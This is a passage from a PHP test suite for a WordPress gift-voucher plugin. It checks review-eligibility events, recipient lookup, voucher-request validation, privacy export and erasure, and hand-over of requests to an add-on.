check( 'Captain Suite review: built-in Pass Captain targets and shop orders stay excluded even when configured', $cs_before === count( $cs_events ) && array( 'counter', 'external' ) === ReviewSource::channels() );
do_action( 'vcap_voucher_redeemed', $cs_external );
$cs_ext_ref = ReviewSource::reference( 'external:spa:booking:77' );
check( 'Captain Suite review: an external redemption for a registered service target is eligible when "external" is configured', $cs_before + 1 === count( $cs_events ) && $cs_ext_ref === end( $cs_events )['reference'] && 'external' === end( $cs_events )['channel'] );
// Revocation: counter cancellation, external refund, voided voucher – each once.
$cs_before = count( $cs_events );
do_action( 'vcap_redemption_reversed', 11, 701, 80.0, 'wrong card' );
do_action( 'vcap_redemption_reversed', 11, 701, 80.0, 'wrong card' );
$cs_rev = end( $cs_events );
check( 'Captain Suite review: a cancelled counter redemption (redeem_reversed) is revoked once with the same reference', $cs_before + 1 === count( $cs_events ) && 'revoked' === $cs_rev['event'] && $cs_ref === $cs_rev['reference'] && $cs_ref . ':revoked' === $cs_rev['event_id'] && 'redeem_reversed' === $cs_rev['reason'] && ReviewSource::PAYLOAD_KEYS === array_keys( $cs_rev ) );
do_action( 'vcap_redemption_refunded', array( 'redemption_key' => 'spa:booking:77', 'refunded' => 10.0 ), 10.0 );
check( 'Captain Suite review: a refund of an external redemption revokes it ("refunded")', $cs_before + 2 === count( $cs_events ) && 'refunded' === end( $cs_events )['reason'] && 'revoked' === $cs_source->get( $cs_ext_ref )['event'] );
do_action( 'vcap_redemption_reversed', 11, 999, 5.0, 'unknown' );
do_action( 'vcap_redemption_refunded', array( 'redemption_key' => 'never-eligible' ), 1.0 );
check( 'Captain Suite review: revoking a redemption that was never eligible sends nothing', $cs_before + 2 === count( $cs_events ) );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 708 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'event_id' => 709, 'voucher_id' => 14 ) + $cs_counter );
$cs_before = count( $cs_events );
do_action( 'vcap_voucher_event', 11, 'voided', null, 0.0, 'refund', 5, 'admin', 1 );
check( 'Captain Suite review: voiding the voucher revokes its open references (already revoked ones are not sent again)', $cs_before + 1 === count( $cs_events ) && ReviewSource::reference( 'counter:708' ) === end( $cs_events )['reference'] && 'voided' === end( $cs_events )['reason'] );
// D4 (owner decision 16.11.2026): one service = one request – only the first confirmed redemption of a voucher.
$cs_before = count( $cs_events );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 901 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 902 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 902 ) + $cs_counter );
check( 'Decision D4: a gift card (balance) redeemed twice at the counter is eligible once – the second redemption creates no event and no record', $cs_before + 1 === count( $cs_events ) && ReviewSource::reference( 'counter:901' ) === end( $cs_events )['reference'] && null === $cs_source->get( ReviewSource::reference( 'counter:902' ) ) && ReviewSource::reference( 'counter:901' ) === $cs_source->open_reference( 16 ) && ReviewSource::first_redemption_only( $cs_vouchers[16] ), json_encode( array_slice( $cs_events, $cs_before ) ) );
do_action( 'vcap_redemption_reversed', 16, 902, 10.0, 'not eligible' );
check( 'Decision D4: cancelling a later redemption that was never eligible sends nothing', $cs_before + 1 === count( $cs_events ) );
do_action( 'vcap_redemption_reversed', 16, 901, 10.0, 'wrong card' );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 903 ) + $cs_counter );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 904 ) + $cs_counter );
$cs_d4 = array_slice( $cs_events, $cs_before + 1 );
check( 'Decision D4: after the first redemption was revoked (redeem_reversed) the next confirmed redemption is eligible again – and only that one', 2 === count( $cs_d4 ) && 'revoked' === $cs_d4[0]['event'] && 'redeem_reversed' === $cs_d4[0]['reason'] && 'eligible' === $cs_d4[1]['event'] && ReviewSource::reference( 'counter:903' ) === $cs_d4[1]['reference'] && null === $cs_source->get( ReviewSource::reference( 'counter:904' ) ), json_encode( $cs_d4 ) );
add_filter( 'vcap_review_external_target_prefixes', static fn() => array( 'spa:' ) );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'redemption_key' => 'spa:booking:91' ) + $cs_external );
do_action( 'vcap_redemption_refunded', array( 'redemption_key' => 'spa:booking:91' ), 5.0 );
check( 'Decision D4: an external redemption of the same voucher counts as a further redemption (no event while the first is eligible)', $cs_before + 3 === count( $cs_events ) );
$GLOBALS['vcap_test_options'][ ReviewSource::CLAIM_PREFIX . 17 ] = array( 'reference' => ReviewSource::reference( 'counter:999001' ), 'at' => time() );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 17, 'event_id' => 905 ) + $cs_counter );
$cs_d4_busy = count( $cs_events );
$GLOBALS['vcap_test_options'][ ReviewSource::CLAIM_PREFIX . 17 ]['at'] = time() - 120;
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 17, 'event_id' => 906 ) + $cs_counter );
check( 'Decision D4: two redemptions at the same moment – a fresh claim of another redemption wins (no second event), an abandoned claim is taken over', $cs_before + 3 === $cs_d4_busy && $cs_before + 4 === count( $cs_events ) && ReviewSource::reference( 'counter:906' ) === end( $cs_events )['reference'] && ReviewSource::reference( 'counter:906' ) === get_option( ReviewSource::CLAIM_PREFIX . 17 )['reference'] );
add_filter( 'vcap_review_first_redemption_only', static fn() => false );
do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => 16, 'event_id' => 907 ) + $cs_counter );
check( 'Decision D4: filter vcap_review_first_redemption_only false – every confirmed redemption counts on its own again', $cs_before + 5 === count( $cs_events ) && ReviewSource::reference( 'counter:907' ) === end( $cs_events )['reference'] && 'eligible' === $cs_source->get( ReviewSource::reference( 'counter:903' ) )['event'] );
array_pop( $GLOBALS['vcap_test_filters']['vcap_review_first_redemption_only'] );
$cs_open = $cs_source->open_references( 16 );
check( 'Review source 1.2.0: open_references() lists every eligible reference of a voucher, oldest first (every redemption counts), open_reference() the oldest; none for an unknown voucher', count( $cs_open ) >= 2 && ReviewSource::reference( 'counter:907' ) === end( $cs_open ) && $cs_open[0] === $cs_source->open_reference( 16 ) && array() === $cs_source->open_references( 987654 ) && '' === $cs_source->open_reference( 987654 ) && str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), '`open_references( int $voucher_id ): string[]`' ), wp_json_encode( $cs_open ) );
array_pop( $GLOBALS['vcap_test_filters']['vcap_review_external_target_prefixes'] );
$cs_source->forget_voucher( 17, 'deleted' );
check( 'Decision D4: the claim of a voucher goes with its references (erased or deleted voucher)', false === get_option( ReviewSource::CLAIM_PREFIX . 17, false ) );
$cs_d4_doc = (string) file_get_contents( dirname( __DIR__ ) . '/API.md' );
check( 'Decision D4: API.md documents the first-redemption rule and its filter in "Which redemptions count"', str_contains( $cs_d4_doc, '`vcap_review_first_redemption_only`' ) && str_contains( $cs_d4_doc, 'only the **first** confirmed redemption' ) );
// Recipient: only for authorised callers, never for revoked or opted-out references.
$cs_ref14 = ReviewSource::reference( 'counter:709' );
$cs_no    = $cs_source->recipient( $cs_ref14 );
add_filter( 'vcap_review_recipient_allowed', static fn() => true );
$cs_rec   = $cs_source->recipient( $cs_ref14 );
$cs_gone  = $cs_source->recipient( $cs_ref );
$cs_bad   = $cs_source->recipient( 'vcr1_nothing' );
add_filter( 'vcap_review_opted_out', static fn( $out, $email ) => 'bea@example.com' === $email, 10, 2 );
$cs_out   = $cs_source->recipient( $cs_ref14 );
check(
	'Captain Suite review: the address is resolved only with permission (recipient, else buyer), refused for revoked, unknown and opted-out references',
	is_wp_error( $cs_no ) && 'vcap_review_not_allowed' === $cs_no->get_error_code()
		&& is_array( $cs_rec ) && 'bea@example.com' === $cs_rec['email'] && 'buyer' === $cs_rec['role'] && array( 'reference', 'email', 'name', 'role', 'locale' ) === array_keys( $cs_rec ) && 'de_DE' === $cs_rec['locale']
		&& is_wp_error( $cs_gone ) && 'vcap_review_revoked' === $cs_gone->get_error_code()
		&& is_wp_error( $cs_bad ) && 'vcap_review_unknown_reference' === $cs_bad->get_error_code()
		&& is_wp_error( $cs_out ) && 'vcap_review_opted_out' === $cs_out->get_error_code(),
	json_encode( array( $cs_rec, is_wp_error( $cs_gone ) ? $cs_gone->get_error_code() : $cs_gone ) )
);
// Addition to D4: recipient() names the language of the invitation – order language, else account, else site.
if ( ! function_exists( 'get_user_by' ) ) {
	function get_user_by( $field, $value ) { return 'email' === $field ? ( $GLOBALS['vcap_test_users'][ strtolower( (string) $value ) ] ?? false ) : false; }
}
if ( ! function_exists( 'get_user_locale' ) ) {
	function get_user_locale( $user = 0 ) { foreach ( $GLOBALS['vcap_test_users'] ?? array() as $u ) { if ( (int) $u->ID === (int) ( is_object( $user ) ? $user->ID : $user ) ) { return '' !== $u->locale ? $u->locale : get_locale(); } } return get_locale(); }
}
if ( ! function_exists( 'pll_languages_list' ) ) {
	function pll_languages_list( $args = array() ) { $l = $GLOBALS['vcap_test_pll'] ?? array(); return 'slug' === ( $args['fields'] ?? '' ) ? array_keys( $l ) : array_values( $l ); }
}
array_pop( $GLOBALS['vcap_test_filters']['vcap_review_opted_out'] );
$GLOBALS['vcap_test_users']['bea@example.com'] = (object) array( 'ID' => 77, 'locale' => 'de_AT' );
$cs_loc_account = $cs_source->recipient( $cs_ref14 )['locale'] ?? '';
$GLOBALS['vcap_test_pll'] = array( 'fr' => 'fr_FR' );
add_filter( 'vcap_order_language', static fn() => 'fr' );
$cs_loc_order = $cs_source->recipient( $cs_ref14 )['locale'] ?? '';
add_filter( 'vcap_email_locale', static fn( $l ) => 'fr_FR' === $l ? 'fr_BE' : $l );
$cs_loc_email = $cs_source->recipient( $cs_ref14 )['locale'] ?? '';
array_pop( $GLOBALS['vcap_test_filters']['vcap_email_locale'] );
array_pop( $GLOBALS['vcap_test_filters']['vcap_order_language'] );
unset( $GLOBALS['vcap_test_users']['bea@example.com'], $GLOBALS['vcap_test_pll'] );
$cs_loc_site = $cs_source->recipient( $cs_ref14 )['locale'] ?? '';
$cs_loc_doc  = (string) file_get_contents( dirname( __DIR__ ) . '/API.md' );
check( 'Decision D4 (addition): recipient() answers locale – order language (through vcap_email_locale) before the account locale before the site language; contract 1.1.0 documented', 'de_AT' === $cs_loc_account && 'fr_FR' === $cs_loc_order && 'fr_BE' === $cs_loc_email && 'de_DE' === $cs_loc_site && str_contains( $cs_loc_doc, '`locale`' ) && str_contains( $cs_loc_doc, 'contract 1.1.0' ), json_encode( array( $cs_loc_account, $cs_loc_order, $cs_loc_email, $cs_loc_site ) ) );
check( 'Captain Suite review: product setting "Redemption confirms a service" defaults to off', 'no' === ProductConfig::DEFAULTS['review_service'] && ProductConfig::meta_key( 'review_service' ) === ReviewSource::PRODUCT_META );
$GLOBALS['vcap_test_filters'] = $cs_filters;

// Voucher requests (form action contract v1): a request is a draft only.
if ( ! function_exists( 'wp_insert_post' ) ) {
	function wp_insert_post( $postarr, $wp_error = false ) {
		$id = 9000 + count( $GLOBALS['vcap_test_posts'] ?? array() );
		$GLOBALS['vcap_test_posts'][ $id ] = (array) $postarr;
		return $id;
	}
}
if ( ! function_exists( 'add_post_meta' ) ) {
	function add_post_meta( $id, $k, $v, $unique = false ) { $GLOBALS['vcap_test_meta'][ $id ][ $k ][] = $v; return true; }
}
if ( ! function_exists( 'wp_delete_post' ) ) {
	function wp_delete_post( $id, $force = false ) { unset( $GLOBALS['vcap_test_posts'][ (int) $id ], $GLOBALS['vcap_test_meta'][ (int) $id ] ); return true; }
}
$cs_issued   = array();
$cs_requests = new VoucherRequests(
	static function ( array $args ) use ( &$cs_issued ) {
		$cs_issued[] = $args;
		$v           = new Voucher();
		$v->id       = 3000 + count( $cs_issued );
		return $v;
	},
	static fn() => array(),
	static fn() => 0
);
$cs_in = array(
	'contract'   => '1.0',
	'reference'  => 'formcaptain:entry:4711',
	'kind'       => 'company_order',
	'amount'     => '25,50',
	'contact'    => array( 'company' => 'ACME GmbH', 'name' => 'Hanna HR', 'email' => 'hr@acme.example' ),
	'recipients' => array( array( 'name' => 'Ann', 'email' => 'ann@acme.example' ), array( 'name' => 'Ben', 'email' => '' ) ),
	'paid'       => true,
	'code'       => 'MYCODE',
	'send'       => true,
	'status'     => 'issued',
);
$cs_clean = VoucherRequests::normalise( $cs_in );
check( 'Captain Suite form: a request is cleaned to the contract keys – payment, code, sending and status from the form are dropped', is_array( $cs_clean ) && array( 'contract', 'reference', 'kind', 'product_id', 'amount', 'quantity', 'recipients', 'contact', 'message', 'note', 'received_at' ) === array_keys( $cs_clean ) && 25.5 === $cs_clean['amount'] && 2 === $cs_clean['quantity'] && ! str_contains( (string) wp_json_encode( $cs_clean ), 'MYCODE' ), json_encode( $cs_clean ) );
$cs_errs = array_map(
	static fn( $r ) => is_wp_error( $r ) ? $r->get_error_code() : 'ok',
	array(
		VoucherRequests::normalise( array( 'contract' => '2.0.0' ) + $cs_in ),
		VoucherRequests::normalise( array( 'reference' => 'short' ) + $cs_in ),
		VoucherRequests::normalise( array( 'contact' => array( 'email' => 'nope' ) ) + $cs_in ),
		VoucherRequests::normalise( array( 'recipients' => array( array( 'email' => 'bad@' ) ) ) + $cs_in ),
		VoucherRequests::normalise( array( 'recipients' => array(), 'quantity' => 101 ) + $cs_in ),
		VoucherRequests::normalise( array( 'product_id' => 77 ) + $cs_in ),
		VoucherRequests::normalise( array( 'amount' => '-5' ) + $cs_in ),
	)
);
check( 'Captain Suite form: other contract majors, bad references and addresses, too many vouchers, non-voucher products and negative values are refused', array( 'vcap_request_contract', 'vcap_invalid_request', 'vcap_invalid_email', 'vcap_invalid_email', 'vcap_invalid_request', 'vcap_invalid_product', 'vcap_invalid_amount' ) === $cs_errs, implode( ',', $cs_errs ) );
$cs_sub  = $cs_requests->submit( $cs_in );
$cs_id   = is_array( $cs_sub ) ? $cs_sub['request_id'] : 0;
$cs_rep  = $cs_requests->submit( $cs_in );
$cs_req  = VoucherRequests::get( $cs_id );
check( 'Captain Suite form: submit() stores an open request (private post) and issues nothing; the same form entry again is answered as a replay', is_array( $cs_sub ) && $cs_id > 0 && false === $cs_sub['replayed'] && 'open' === $cs_sub['state'] && is_array( $cs_rep ) && true === $cs_rep['replayed'] && $cs_id === $cs_rep['request_id'] && 'private' === $GLOBALS['vcap_test_posts'][ $cs_id ]['post_status'] && VoucherRequests::POST_TYPE === get_post_type( $cs_id ) && is_array( $cs_req ) && 'open' === $cs_req['state'] && array() === $cs_issued, json_encode( array( $cs_sub, $cs_rep ) ) );
$cs_conf = $cs_requests->confirm( $cs_id, array( 'sale' => 'sold', 'send' => true ) );
$cs_rej  = $cs_requests->reject( $cs_id );
check( 'Captain Suite form: without the right to issue vouchers confirm() and reject() are refused – no voucher, request stays open', is_wp_error( $cs_conf ) && 'vcap_not_allowed' === $cs_conf->get_error_code() && is_wp_error( $cs_rej ) && array() === $cs_issued && 'open' === VoucherRequests::get( $cs_id )['state'] );
$cs_args = VoucherRequests::issue_args( $cs_req, $cs_id, 1, array( 'sale' => 'free', 'send' => false ) );
$cs_sold = VoucherRequests::issue_args( $cs_req, $cs_id, 0, array( 'sale' => 'sold', 'send' => true, 'product_id' => 0, 'amount' => '' ) );
$cs_none = VoucherRequests::issue_args( $cs_req, $cs_id, 0, array() );
check( 'Captain Suite form: the issuing arguments use a stable reference per voucher, the company as buyer, and "paid" only after the manager chose "sold"', 'vcap-request:' . $cs_id . '/2' === $cs_args['reference'] && false === $cs_args['paid'] && false === $cs_args['send'] && 'ACME GmbH' === $cs_args['buyer_name'] && 'hr@acme.example' === $cs_args['buyer_email'] && '' === $cs_args['recipient_email'] && 25.5 === $cs_args['amount'] && 'giftcard' === $cs_args['type'] && true === $cs_sold['paid'] && 'ann@acme.example' === $cs_sold['recipient_email'] && 'vcap-request:' . $cs_id . '/1' === $cs_sold['reference'] && false === $cs_none['paid'] && 'request' === $cs_sold['source'], json_encode( $cs_args ) );
$cs_issue_all = new ReflectionMethod( VoucherRequests::class, 'issue_all' );
$cs_issue_all->setAccessible( true );
$cs_all = $cs_issue_all->invoke( $cs_requests, $cs_req, $cs_id, array( 'sale' => 'sold' ) );
$cs_again = $cs_issue_all->invoke(
	new VoucherRequests( static fn( array $a ) => str_ends_with( $a['reference'], '/1' ) ? new WP_Error( 'vcap_reference_used', 'used', array( 'voucher_id' => 3001 ) ) : new WP_Error( 'vcap_invalid_amount', 'Please give a voucher value greater than zero.' ) ),
	$cs_req,
	$cs_id,
	array( 'sale' => 'sold' )
);
check( 'Captain Suite form: after confirmation one voucher per recipient is issued through the voucher service; a repeat keeps issued ones and reports the rest (partial)', 'issued' === $cs_all['state'] && array( 3001, 3002 ) === $cs_all['vouchers'] && 2 === count( $cs_issued ) && 'partial' === $cs_again['state'] && array( 3001 ) === $cs_again['vouchers'] && 1 === count( $cs_again['errors'] ), json_encode( array( $cs_all, $cs_again ) ) );
$GLOBALS['vcap_test_filters'] = $cs_filters;

// Captain Suite follow-up: erased or deleted vouchers withdraw their review references; privacy tools and the open
// limit of voucher requests.
$cs_events = array();
$cs_vouchers2 = array( 21 => $cs_voucher( 21 ), 22 => $cs_voucher( 22 ), 23 => $cs_voucher( 23, array( 'recipient_email' => '', 'buyer_email' => '' ) ) );
$cs_source2   = new ReviewSource( static fn( int $id ) => $cs_vouchers2[ $id ] ?? null );
$cs_source2->register();
add_action( ReviewSource::EVENT_ELIGIBLE, static function ( $p ) use ( &$cs_events ) { $cs_events[] = $p; } );
add_action( ReviewSource::EVENT_REVOKED, static function ( $p ) use ( &$cs_events ) { $cs_events[] = $p; } );
add_filter( 'vcap_review_recipient_allowed', static fn() => true );
foreach ( array( 21 => 801, 22 => 802, 23 => 803 ) as $cs_vid => $cs_eid ) {
	do_action( 'vcap_voucher_redeemed', array( 'voucher_id' => $cs_vid, 'event_id' => $cs_eid ) + $cs_counter );
}
do_action( 'vcap_voucher_event', 21, VCAP\TaxAccounting::ERASED_EVENT, null, null, '', 0, 'admin', 1 );
$cs_r21 = ReviewSource::reference( 'counter:801' );
$cs_g21 = $cs_source2->recipient( $cs_r21 );
check( 'Captain Suite review: the privacy eraser of a voucher revokes its references ("erased"), unlinks them and drops the index – no recipient can be resolved', 4 === count( $cs_events ) && 'erased' === $cs_events[3]['reason'] && $cs_r21 === $cs_events[3]['reference'] && is_wp_error( $cs_g21 ) && 'vcap_review_revoked' === $cs_g21->get_error_code() && 0 === get_option( ReviewSource::OPTION_PREFIX . $cs_r21 )['voucher_id'] && false === get_option( ReviewSource::INDEX_PREFIX . 21, false ), json_encode( $cs_events ) );
do_action( 'vcap_voucher_deleted', $cs_vouchers2[22] );
$cs_g23 = $cs_source2->recipient( ReviewSource::reference( 'counter:803' ) );
$cs_g23b = $cs_source2->recipient( ReviewSource::reference( 'counter:803' ) );
check( 'Captain Suite review: a deleted voucher revokes its references ("deleted"); a voucher without any address left (retention) is withdrawn on the first lookup', 6 === count( $cs_events ) && 'deleted' === $cs_events[4]['reason'] && 'no_recipient' === $cs_events[5]['reason'] && is_wp_error( $cs_g23 ) && 'vcap_review_no_recipient' === $cs_g23->get_error_code() && is_wp_error( $cs_g23b ) && 'vcap_review_revoked' === $cs_g23b->get_error_code(), json_encode( array_slice( $cs_events, 4 ) ) );
$GLOBALS['vcap_test_filters'] = $cs_filters;

$cs_find  = static function ( string $email, int $limit, int $offset ): array {
	$ids = array();
	foreach ( $GLOBALS['vcap_test_meta'] as $id => $meta ) {
		if ( in_array( strtolower( $email ), (array) ( $meta[ VoucherRequests::EMAIL_META ] ?? array() ), true ) ) {
			$ids[] = (int) $id;
		}
	}
	return array_slice( $ids, $offset, $limit );
};
$cs_open  = 0;
$cs_req2  = new VoucherRequests( static fn( array $a ) => new WP_Error( 'x', 'not used' ), $cs_find, static function ( int $cap ) use ( &$cs_open ) { return min( $cap, $cs_open ); } );
$cs_req2->register();
$cs_p_in  = array( 'reference' => 'formcaptain:entry:privacy-1', 'contact' => array( 'company' => 'ACME', 'name' => 'Hanna', 'email' => 'HR2@acme.example', 'phone' => '+43 1 234' ), 'message' => 'Für das Team', 'recipients' => array( array( 'name' => 'Ann', 'email' => 'ann2@acme.example', 'message' => 'Danke Ann' ), array( 'name' => 'Bob', 'email' => 'bob2@acme.example' ) ) );
$cs_p_id  = $cs_req2->submit( $cs_p_in )['request_id'] ?? 0;
$cs_ex_a  = $cs_req2->export( 'ann2@acme.example' );
$cs_ex_c  = $cs_req2->export( 'hr2@acme.example' );
$cs_vals  = static fn( array $ex ) => implode( '|', array_column( $ex['data'][0]['data'] ?? array(), 'value' ) );
check( 'Captain Suite form: requests are found by every address they name (lower case) and exported per person – a recipient sees only their own entry, the contact the contact data', array( 'hr2@acme.example', 'ann2@acme.example', 'bob2@acme.example' ) === $GLOBALS['vcap_test_meta'][ $cs_p_id ][ VoucherRequests::EMAIL_META ] && 1 === count( $cs_ex_a['data'] ) && $cs_ex_a['done'] && 'vcap-voucher-requests' === $cs_ex_a['data'][0]['group_id'] && 'vcap-request-' . $cs_p_id === $cs_ex_a['data'][0]['item_id'] && str_contains( $cs_vals( $cs_ex_a ), 'Danke Ann' ) && ! str_contains( $cs_vals( $cs_ex_a ), 'bob2' ) && ! str_contains( $cs_vals( $cs_ex_a ), '+43' ) && str_contains( $cs_vals( $cs_ex_c ), '+43 1 234' ) && str_contains( $cs_vals( $cs_ex_c ), 'Für das Team' ) && ! str_contains( $cs_vals( $cs_ex_c ), 'ann2' ), $cs_vals( $cs_ex_a ) . ' / ' . $cs_vals( $cs_ex_c ) );
$cs_er    = $cs_req2->erase( 'ANN2@acme.example' );
$cs_after = get_post_meta( $cs_p_id, VoucherRequests::META, true );
// The test stub of delete_post_meta() drops all rows of the key (WordPress drops only the row with that value).
$cs_erased_index = $GLOBALS['vcap_test_meta'][ $cs_p_id ][ VoucherRequests::EMAIL_META ] ?? null;
$GLOBALS['vcap_test_meta'][ $cs_p_id ][ VoucherRequests::EMAIL_META ] = array( 'hr2@acme.example', 'bob2@acme.example' );
$cs_er_c  = $cs_req2->erase( 'hr2@acme.example' );
$cs_after2 = get_post_meta( $cs_p_id, VoucherRequests::META, true );
check( 'Captain Suite form: the eraser removes name, address and message of the erased person only; for the contact also phone, message and note (company and count stay)', $cs_er['items_removed'] && ! $cs_er['items_retained'] && $cs_er['done'] && null === $cs_erased_index && array( 'name' => '', 'email' => '', 'message' => '' ) === $cs_after['recipients'][0] && 'bob2@acme.example' === $cs_after['recipients'][1]['email'] && 'HR2@acme.example' === $cs_after['contact']['email'] && $cs_er_c['items_removed'] && '' === $cs_after2['contact']['email'] && '' === $cs_after2['contact']['phone'] && '' === $cs_after2['contact']['name'] && '' === $cs_after2['message'] && 'ACME' === $cs_after2['contact']['company'] && 2 === $cs_after2['quantity'] && array() === $cs_req2->export( 'hr2@acme.example' )['data'], json_encode( $cs_after2 ) );
check( 'Captain Suite form: exporter and eraser are registered with WordPress\'s privacy tools', isset( apply_filters( 'wp_privacy_personal_data_exporters', array() )['voucher-captain-requests'], apply_filters( 'wp_privacy_personal_data_erasers', array() )['voucher-captain-requests'] ) );
$cs_open  = 500;
$cs_full  = $cs_req2->submit( array( 'reference' => 'formcaptain:entry:privacy-2' ) + $cs_p_in );
$cs_again = $cs_req2->submit( $cs_p_in );
add_filter( 'vcap_voucher_requests_max_open', static fn() => 501 );
$cs_more  = $cs_req2->submit( array( 'reference' => 'formcaptain:entry:privacy-3' ) + $cs_p_in );
$GLOBALS['vcap_test_filters'] = $cs_filters;
$cs_open  = 0;
add_filter( 'vcap_voucher_requests_max_open', static fn() => 0 );
$cs_none  = $cs_req2->submit( array( 'reference' => 'formcaptain:entry:privacy-4' ) + $cs_p_in );
check( 'Captain Suite form: with 500 open requests (vcap_voucher_requests_max_open) submit() refuses new ones with vcap_request_limit (429), a repeated entry is still answered, a higher limit accepts, 0 accepts none', is_wp_error( $cs_full ) && 'vcap_request_limit' === $cs_full->get_error_code() && 429 === $cs_full->get_error_data()['status'] && false === get_option( VoucherRequests::CLAIM_PREFIX . md5( 'formcaptain:entry:privacy-2' ), false ) && is_array( $cs_again ) && $cs_again['replayed'] && is_array( $cs_more ) && ! $cs_more['replayed'] && is_wp_error( $cs_none ) && 'vcap_request_limit' === $cs_none->get_error_code() );
check( 'Captain Suite form: the suggested privacy policy text names voucher requests', (bool) array_filter( VCAP\Privacy::policy_paragraphs(), static fn( $p ) => str_starts_with( $p, 'Voucher requests:' ) ) );
$GLOBALS['vcap_test_filters'] = $cs_filters;

// Decision D5 (16.11.2026): an open request with several recipients can be handed over to a company order of an add-on.
$d5_can   = false;
$d5_calls = array();
$d5_req   = new VoucherRequests( static fn( array $a ) => new WP_Error( 'x', 'not used' ), $cs_find, static fn() => 0, static function () use ( &$d5_can ) { return $d5_can; } );
$d5_in    = array( 'reference' => 'formcaptain:entry:d5-1', 'amount' => '30', 'contact' => array( 'company' => 'ACME GmbH', 'name' => 'Hanna HR', 'email' => 'hr5@acme.example', 'phone' => '+43 5' ), 'message' => 'Für das Team', 'note' => 'Rechnung an die Buchhaltung', 'recipients' => array( array( 'name' => 'Ann', 'email' => 'ann5@acme.example', 'message' => 'Danke Ann' ), array( 'name' => 'Bob', 'email' => 'bob5@acme.example' ) ) );
$d5_id    = (int) ( $d5_req->submit( $d5_in )['request_id'] ?? 0 );
$d5_solo  = (int) ( $d5_req->submit( array( 'reference' => 'formcaptain:entry:d5-2', 'recipients' => array( array( 'name' => 'Solo', 'email' => 'solo5@acme.example' ) ) ) + $d5_in )['request_id'] ?? 0 );
$d5_bad   = (int) ( $d5_req->submit( array( 'reference' => 'formcaptain:entry:d5-3' ) + $d5_in )['request_id'] ?? 0 );
$d5_can   = true;
$d5_none  = $d5_req->hand_over( $d5_id );
check( 'Decision D5: without an add-on the button is not offered and a hand-over is refused – the request stays open with its data', ! $d5_req->handover_available( VoucherRequests::get( $d5_id ) ) && is_wp_error( $d5_none ) && 'vcap_handover_unavailable' === $d5_none->get_error_code() && 'open' === VoucherRequests::get( $d5_id )['state'] && 2 === count( VoucherRequests::get( $d5_id )['recipients'] ) );
add_filter( 'vcap_voucher_request_handover_available', static fn( $available, $id ) => true, 10, 2 );
$d5_answer = null;
add_filter(
	'vcap_voucher_request_handover',
	static function ( $result, $handover ) use ( &$d5_calls, &$d5_answer ) {
		$d5_calls[] = $handover;
		return $d5_answer;
	},
	10,
	2
);
$d5_can    = false;
$d5_denied = $d5_req->hand_over( $d5_id );
check( 'Decision D5: without vcap_manage_vouchers there is no button and the hand-over is refused (vcap_not_allowed, 403) before the add-on is asked', ! $d5_req->handover_available( VoucherRequests::get( $d5_id ) ) && is_wp_error( $d5_denied ) && 'vcap_not_allowed' === $d5_denied->get_error_code() && 403 === $d5_denied->get_error_data()['status'] && array() === $d5_calls );
$d5_can = true;
check( 'Decision D5: the button needs an open request with at least two recipients and the add-on\'s yes', $d5_req->handover_available( VoucherRequests::get( $d5_id ) ) && ! $d5_req->handover_available( VoucherRequests::get( $d5_solo ) ) && is_wp_error( $d5_req->hand_over( $d5_solo ) ) && 'vcap_handover_not_possible' === $d5_req->hand_over( $d5_solo )->get_error_code() && ! VoucherRequests::handover_possible( array( 'state' => 'partial' ) + VoucherRequests::get( $d5_id ) ) && array() === $d5_calls );
$d5_null = $d5_req->hand_over( $d5_id );
check( 'Decision D5: null from the hand-over filter (nobody answered) → "No extension takes over this request.", the request stays open', is_wp_error( $d5_null ) && 'vcap_handover_unavailable' === $d5_null->get_error_code() && 'No extension takes over this request.' === $d5_null->get_error_message() && 1 === count( $d5_calls ) && 'open' === VoucherRequests::get( $d5_id )['state'] );
$d5_payload = $d5_calls[0] ?? array();
check(
	'Decision D5: the hand-over carries exactly contract 1.0.0, request_id, the stable reference vcap-request:{id}, company, currency, recipients (name, email, amount, message) and note',
	array( 'contract', 'request_id', 'reference', 'company', 'currency', 'recipients', 'note' ) === array_keys( $d5_payload ) && '1.0.0' === $d5_payload['contract'] && $d5_id === $d5_payload['request_id'] && 'vcap-request:' . $d5_id === $d5_payload['reference']
		&& array( 'name' => 'ACME GmbH', 'contact_name' => 'Hanna HR', 'contact_email' => 'hr5@acme.example', 'contact_phone' => '+43 5' ) === $d5_payload['company'] && 'EUR' === $d5_payload['currency']
		&& array( array( 'name' => 'Ann', 'email' => 'ann5@acme.example', 'amount' => 30.0, 'message' => 'Danke Ann' ), array( 'name' => 'Bob', 'email' => 'bob5@acme.example', 'amount' => 30.0, 'message' => '' ) ) === $d5_payload['recipients'] && "Für das Team\n\nRechnung an die Buchhaltung" === $d5_payload['note'],
	json_encode( $d5_payload )
);
$d5_answer = new WP_Error( 'voucher_captain_pro_handover_contract', 'Unsupported contract.' );
$d5_err    = $d5_req->hand_over( $d5_id );
check( 'Decision D5: a WP_Error of the add-on is passed on – state open, recipients and their lookup rows kept', is_wp_error( $d5_err ) && 'voucher_captain_pro_handover_contract' === $d5_err->get_error_code() && 'open' === VoucherRequests::get( $d5_id )['state'] && 2 === count( VoucherRequests::get( $d5_id )['recipients'] ) && in_array( 'ann5@acme.example', (array) $GLOBALS['vcap_test_meta'][ $d5_id ][ VoucherRequests::EMAIL_META ], true ) && null === VoucherRequests::handover( $d5_id ) );
$d5_answer = array( 'url' => '', 'order_id' => 0 );
$d5_inv    = $d5_req->hand_over( $d5_bad );
check( 'Decision D5: an answer without order id or URL is no hand-over (vcap_handover_invalid), the request stays open', is_wp_error( $d5_inv ) && 'vcap_handover_invalid' === $d5_inv->get_error_code() && 'open' === VoucherRequests::get( $d5_bad )['state'] );
$d5_answer = array( 'url' => 'https://shop.test/wp-admin/admin.php?page=vcap-pro-bulk&order=812', 'order_id' => 812 );
$d5_events = array();
